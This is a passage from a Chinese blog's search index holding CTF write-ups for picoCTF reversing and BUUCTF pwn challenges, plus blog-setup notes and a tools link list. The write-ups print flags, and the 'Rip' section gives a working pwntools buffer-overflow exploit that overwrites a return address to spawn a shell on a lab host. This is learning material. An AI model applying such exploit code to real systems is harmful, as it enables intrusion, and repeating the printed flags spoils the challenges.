yyds!!!我直接看源码(nnd我不会java怎么办…好在c++基础还可以…)</p><p>吐槽:java获取个输入这么费劲?还得手动创建输入流对象?</p><p>相信椰叶们都能看懂代码…密钥就是这一坨:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-123.png" alt="img"></p><p>而且一看就知道是base64</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-124.png" alt="img"></p><p>《最好用的Base64在线工具》…怕不是不知道CyberChef的大名…</p><p>结束…</p><h2 id="unpackme-py"><a href="#unpackme-py" class="headerlink" title="unpackme.py:"></a>unpackme.py:</h2><p>经典的加密解密库(但是我不会)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-125.png" alt="img"></p><p>第12行发现要对解码后的东西进行运行….所以知道加密的是一段代码,所以把exec换成print逝逝:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-126.png" alt="img"></p><p>这里有点奇葩,命令行找不到我的库…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-127.png" alt="img"></p><p>还是打开pycharm吧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-128.png" alt="img"></p><p>好吧直接结束…</p><h2 id="bloat-py"><a href="#bloat-py" class="headerlink" title="bloat.py:"></a>bloat.py:</h2><p>这个程序的函数名和变量名一看就是故意的…加点注释一点点分析看看:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-129.png" alt="img"></p><p>可以看到函数arg133()中有一个比较,并且对比成功了会有一个输出,我们直接将那个字符串单独打印看看(先把其他代码注释掉):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-130.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-131.png" alt="img"></p><p>也就是说我们输入的arg432变量的值就是这个,所以将代码恢复原样重新以这个输入值运行一遍:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-132.png" alt="img"></p><p>解密成功!</p><p>注: .enc文件为常见的加密后的文件格式,常常出现在勒索病毒运行后的结果,或对文件进行加密的情况,这里的代码即对其进行特定方式的解密</p><h2 id="Fresh-Java"><a href="#Fresh-Java" class="headerlink" title="Fresh Java:"></a>Fresh Java:</h2><p>这道题也不难,逆向一下class文件,然后写个解密脚本就行</p><h3 id="第一步-java逆向"><a href="#第一步-java逆向" class="headerlink" title="第一步-java逆向:"></a>第一步-java逆向:</h3><p>某椰叶提供的在线逆向网站:<a href="http://javare.cn(注意文本是白色的...我以为出问题了)/">http://javare.cn(注意文本是白色的...我以为出问题了)</a></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-133.png" alt="img"></p><p> 复制到一个java文件,观察发现(虽然我不会java,但是好在会其他语言…)对比的是一个字符串的每一个字符(ASCII码)</p><p>于是,我们可以使用正则表达式…把那一堆ASCII码提取出来(这里在sublimetext4里使用查找替换的正则模式):</p><h3 id="第二步-正则部分"><a href="#第二步-正则部分" class="headerlink" title="第二步-正则部分:"></a>第二步-正则部分:</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步:"></a>第一步:</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-134.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-135.png" alt="img"></p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步:"></a>第二步:</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-136.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-137.png" alt="img"></p><p>直接复制出来</p><h3 id="第三步-解密脚本"><a href="#第三步-解密脚本" class="headerlink" title="第三步-解密脚本:"></a>第三步-解密脚本:</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-138.png" alt="img"></p><p>这是我们处理后的ASCII码(放在in.txt里)↑</p><p>然后写脚本转换为字符串(注意最开头的34被删了,因为它是字符串的长度),这里我使用c++:</p><p>之所以不使用我最擅长的c是因为c++的STL算法库有reverse函数</p><p>暂时无法在飞书文档外展示此内容</p><p>运行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-139.png" alt="img"></p><p>结束…</p><h2 id="Bbbbloat"><a href="#Bbbbloat" class="headerlink" title="Bbbbloat:"></a>Bbbbloat:</h2><p>直接拖IDA里看main:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-140.png" alt="img"></p><p>直接输549255就行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-141.png" alt="img"></p><p>结束…</p><h2 id="Unpackme"><a href="#Unpackme" class="headerlink" title="Unpackme:"></a>Unpackme:</h2><p>这里提示upx脱壳</p><p>首先扔进DIE里看看,发现有UPX加壳(注意是ELF64—Linux):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-142.png" alt="img"></p><p>所以我们去下载UPX进行脱壳(就是第一个):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-143.png" alt="img"></p><p>免安装,解压后即可使用(xz先解压然后tar解包):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-144.png" alt="img"></p><p>脱壳后再检测发现已经没有壳了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-145.png" alt="img"></p><p>丢进IDA即可(代码一看就懂—第17行):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-146.png" alt="img"></p><p>运行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-147.png" alt="img"></p><p>结束…</p><h2 id="Keygenme"><a href="#Keygenme" class="headerlink" title="Keygenme:"></a>Keygenme:</h2><p>我懂那个意思…运行到字符串比较,然后直接看v14变量就行</p><p>但是我的IDA各种问题无法调试…正在重装…</p><p>装好了…IDA远程调试看看这篇文章:</p><p><a href="https://blog.csdn.net/abc_670/article/details/80066817">远程调试</a></p><p>好现在上题:</p><p>至于IDA里打开就不说了,直接找到main函数里if语句调用的函数,如果发现是类似&amp;func+1这样的就F5重新反编译一下一般就可以了:</p><p>经过分析发现flag存在v17[[32-67]那么直接在v17处理后打断点调试就行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-148.png" alt="img"></p><p> 找到v17,观察(整理)出flag即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-149.png" alt="img"></p><p> picoCTF{br1ng_y0ur_0wn_k3y_9d74d90d}</p><p> 结束…</p><h2 id="Wizardlike"><a href="#Wizardlike" class="headerlink" title="Wizardlike:"></a>Wizardlike:</h2><p>运行一遍一看就是个纯地图</p><p>然后很多地方发现过不去—这不就穿墙挂么~~~</p><p>所以我们IDA吧…别问我怎么找到那个函数的…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-150.png" alt="img"></p><p>没错就是这里↑</p><p>看来是判断是否越界的函数了…(类似我以前写的贪吃蛇的is_over_lap()和againstTheWall()函数):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-151.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-152.png" alt="img"></p><p>好了帮助理解结束了,现在直接把返回的0LL全改成非0就行(之所以没说改成1LL是因为我把小端和大端搞反了—我是菜逼):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-153.png" alt="img"></p><p>然后保存就行,接下来直接跑代码观察地图就行,发现地图的形状就是flag~~</p><p>跑吧~~</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-154.png" alt="img"></p><p> 地图贼反人类…慢慢看吧…</p><p> picoCTF{ur_4_w1z4rd_4844AD6F}</p><p> 好像每个人的地图还不一样…</p><p> 结束…</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN:"></a>PWN:</h1><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc:"></a>test_your_nc:</h2><p> 很简单,运行就知道是获取到shell了</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-155.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-156.png" alt="img"></p><p>但是作为PWN手我们要用正确的解题方式</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-157.png" alt="img"></p><p>丢IDA里F5大法,不用解释</p><p>结束…</p><h2 id="Rip"><a href="#Rip" class="headerlink" title="Rip:"></a>Rip:</h2><h3 id="总体分析"><a href="#总体分析" class="headerlink" title="总体分析:"></a>总体分析:</h3><p>先运行,发现有输入(盲猜gets()),丢IDA吧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-158.png" alt="img"></p><p>好,盲猜正确…接下来该面向google解题了…</p><p>看看有没有其他可利用的函数—&gt;找到了fun():</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-159.png" alt="img"></p><p>于是我们就要想办法跳转到这个函数,从而获得shell入口</p><h3 id="如何构造字符串"><a href="#如何构造字符串" class="headerlink" title="如何构造字符串:"></a>如何构造字符串:</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-160.png" alt="img"></p><p>可以发现s变量占15字节(反编译也能看出来char s[15])</p><p>现在问题来了,我们要知道栈溢出的细节:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-161.png" alt="img"></p><p>用DIE工具查看该文件,发现是ELF64(废话),那么针对ELF64的分析如下:</p><p><a href="https://blog.csdn.net/weixin_43780092/article/details/126694251">基础知识可以看看这篇文章</a></p><p>因为本蒟蒻只会一点8086,所以也就大致先看看,有个概念再说…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-162.png" alt="img"></p><p>其实重点就是这张图↑</p><h3 id="对栈帧的分析-也就是分析上图"><a href="#对栈帧的分析-也就是分析上图" class="headerlink" title="对栈帧的分析(也就是分析上图):"></a>对栈帧的分析(也就是分析上图):</h3><p> 首先要知道对于函数栈帧来讲,也就是对于堆栈而言,是从高地址向低地址分配的(所以对s的溢出会影响到上一个函数栈帧—我理解的应该没错)</p><p> 那么我们要进行计算,首先是15字节的s数组,以任意值进行填充,然后是填充当前函数帧的ebp(对于ELF64而言,且其占用8字节—因为是64位机器),此时我们就有15+8&#x3D;&#x3D;23字节了</p><p> 接下来就是我们实际要覆盖的返回地址了,这里在IDA找到fun()函数的地址(0x401186)</p><p> 于是我们在python中写exp(我的环境在linux安装,所以在linux下编写)—我也不知道我啥时候装的环境</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-163.png" alt="img"></p><p> 代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29939</span>) <span class="comment">#靶机地址和端口</span></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">15</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x401186</span>+<span class="number">1</span>).decode(<span class="string">&quot;iso-8859-1&quot;</span>)</span><br><span class="line"><span class="comment">#char s的15个字节+RBP的8字节+fun函数入口地址，+1为了堆栈平衡，p64()发送数据时，是发送的字节流，也就是比特流（二进制流）。</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p> 运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-164.png" alt="img"></p><h3 id="问题来了"><a href="#问题来了" class="headerlink" title="问题来了:"></a>问题来了:</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-165.png" alt="img"></p><p>  是的没错,玄学,这个问题先放在这里吧,暂时搞不了…(哪天回头再看看吧,有地方没理解到位)</p><p>  而且那个堆栈平衡以后也得仔细看看…</p><p>​      勉强算是结束了吧…</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客文档建立日志</title>
      <link href="/2023/06/02/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%8D%9A%E5%AE%A2%E6%96%87%E6%A1%A3%E5%BB%BA%E7%AB%8B%E5%AD%98%E6%A1%A3/"/>
      <url>/2023/06/02/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%8D%9A%E5%AE%A2%E6%96%87%E6%A1%A3%E5%BB%BA%E7%AB%8B%E5%AD%98%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="markdown文件-YAML-Front-Matter-快捷信息备份"><a href="#markdown文件-YAML-Front-Matter-快捷信息备份" class="headerlink" title="markdown文件 YAML Front Matter 快捷信息备份"></a>markdown文件 YAML Front Matter 快捷信息备份</h2><p>2023.07.27</p><table><thead><tr><th align="left">写法</th><th>解释</th></tr></thead><tbody><tr><td align="left">title</td><td>【必需】文章标题</td></tr><tr><td align="left">date</td><td>【必需】文章创建日期(实际博客网页会自动同步,可以不加)</td></tr><tr><td align="left">updated</td><td>【可选】文章更新日期</td></tr><tr><td align="left">tags</td><td>【可选】文章标签</td></tr><tr><td align="left">categories</td><td>【可选】文章分类</td></tr><tr><td align="left">keywords</td><td>【可选】文章关键字</td></tr><tr><td align="left">description</td><td>【可选】文章描述</td></tr></tbody></table><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="图床搭建"><a href="#图床搭建" class="headerlink" title="图床搭建"></a>图床搭建</h2><p>2023.07.27</p><p>使用PicGo+阿里云OSS搭建:</p><p>typora测试PicGo app失败,但是后续测试发现成功</p><h3 id="关键报错问题"><a href="#关键报错问题" class="headerlink" title="关键报错问题:"></a>关键报错问题:</h3><p>​从飞书复制下来的markdown中的图片会上传失败,报错信息:</p><p>​No mime type found for file asynccode</p><p>​解决方案:</p><p>​暂未有直接的解决办法</p><p>​间接解决办法:</p><p>​将typora图片设置为自动保存到某个路径,从而自动生成图片路径为本地的一篇markdown,然后重新改回上传图片,将本地图片全部上传即可解决当前篇博客的图片问题.但是意味着不能每次从飞书这样操作,否则会非常麻烦.</p><h2 id="评论系统配置"><a href="#评论系统配置" class="headerlink" title="评论系统配置"></a>评论系统配置</h2><p>2023.07.28</p><p>基于Twikoo评论系统,使用zeabur部署:</p><p>1.将github上Twikoo的仓库fork到自己的github中</p><p>2.配置zeabur服务</p><p>3.在Hexo框架中(butterfly主题支持该评论系统)对zeabur生成的域名进行连接</p><p>4.成功,部署到网站</p><p>2023.08.04</p><p>1.配置新评论邮箱提醒</p><p>2.配置Navicat16连接到评论数据库(MongoDB),可以进行评论的后台管理</p><h2 id="搜索功能"><a href="#搜索功能" class="headerlink" title="搜索功能"></a>搜索功能</h2><p>添加本地搜索插件—hexo-generator-search</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装插件:</span></span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局_config.yml中添加:</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 主题_config.yml中设置:</span></span><br><span class="line">local_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#注:template配置，无需配置该项,配置了反而无法正常搜索</span></span><br></pre></td></tr></table></figure><h2 id="网址备份"><a href="#网址备份" class="headerlink" title="网址备份"></a>网址备份</h2><h3 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h3><p>Twikoo:<a href="https://twikoo.js.org/">https://twikoo.js.org/</a></p><p>zeabur:<a href="https://dash.zeabur.com/projects">https://dash.zeabur.com/projects</a></p><h3 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h3><p>阿里云OSS:<a href="https://account.aliyun.com/login/login.htm?oauth_callback=https://oss.console.aliyun.com/index?path=img/">https://account.aliyun.com/login/login.htm?oauth_callback=https://oss.console.aliyun.com/index?path=img%2F</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.baidu.com/">https://www.baidu.com</a></p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类导航</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<p>hello world</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/json-data/tools.json"/>
      <url>/json-data/tools.json</url>
      
        <content type="html"><![CDATA[[{"class_name":"CTF工具","class_desc":"常用在线工具","link_list":[{"name":"CyberChef","link":"https://icyberchef.com/","avatar":"/img/artical_pic.png","descr":"编码万能转换"},{"name":"密码破解","link":"http://www.atoolbox.net/Category.php?Id=27&Page=1","avatar":"/img/artical_pic.png","descr":"基本密码在线解密"},{"name":"正则表达式工具","link":"https://c.runoob.com/front-end/854/?optionGlobl=global","avatar":"/img/artical_pic.png","descr":"正则表达式在线处理"},{"name":"BrainF**k and Ook","link":"https://www.splitbrain.org/services/ook","avatar":"/img/artical_pic.png","descr":"某种玄学的东西"},{"name":"因数分解","link":"http://www.factordb.com/index.php","avatar":"/img/artical_pic.png","descr":"一个因数分解数据库"},{"name":"摩斯电码","link":"https://morsecode.world/international/decoder/audio-decoder-adaptive.html","avatar":"/img/artical_pic.png","descr":"不解释"},{"name":"图像处理","link":"https://onlinetools.com/image","avatar":"/img/artical_pic.png","descr":"图像的各种特殊处理"},{"name":"Java在线逆向","link":"http://javare.cn","avatar":"/img/artical_pic.png","descr":"可以class文件..."},{"name":"Awesome-Hacking","link":"https://blog.csdn.net/ZYC88888/article/details/113663486","avatar":"/img/artical_pic.png","descr":"CTF工具库"}]},{"class_name":"转换工具","class_desc":"格式转换的一些小工具","link_list":[{"name":"pdf转换工具","link":"https://www.alltoall.net/","avatar":"/img/artical_pic.png","descr":"文档在线转换"},{"name":"音频格式转换工具","link":"http://ncm.miidj.com/","avatar":"/img/artical_pic.png","descr":"方便使用播放器"},{"name":"操作系统文件格式转换","link":"http://tools.bugscaner.com/text/textconvert.html","avatar":"/img/artical_pic.png","descr":"在线文档格式windows unix macintosh互相转换"}]},{"class_name":"网络工具","class_desc":"网络相关的工具和资源","link_list":[{"name":"测速网","link":"https://www.speedtest.cn/","avatar":"/img/artical_pic.png","descr":"网速测试"},{"name":"Clash","link":"https://github.com/Dreamacro/clash/releases","avatar":"/img/artical_pic.png","descr":"Clash下载直达"},{"name":"虚拟手机号","link":"https://sms-activate.org/cn/getNumber","avatar":"/img/artical_pic.png","descr":"虚拟手机号服务"},{"name":"机场","link":"https://www.mojie.mx/#/login","avatar":"/img/artical_pic.png","descr":"懂?"}]},{"class_name":"其他工具","class_desc":"其他各种工具","link_list":[{"name":"文本对比工具","link":"https://tool.p2hp.com/tool-online-difftext/","avatar":"/img/artical_pic.png","descr":"在线文本对比"},{"name":"大数运算器","link":"https://goodcalculators.com/big-number-calculator/","avatar":"/img/artical_pic.png","descr":"高精度大数在线运算"},{"name":"阶乘运算器","link":"https://zh.numberempire.com/factorialcalculator.php","avatar":"/img/artical_pic.png","descr":"阶乘计算"}]}]]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>在线工具</title>
      <link href="/tools/index.html"/>
      <url>/tools/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>我的影子</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>我的标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<p>hello world</p>]]></content>
      
    </entry>
    
    
  
</search>
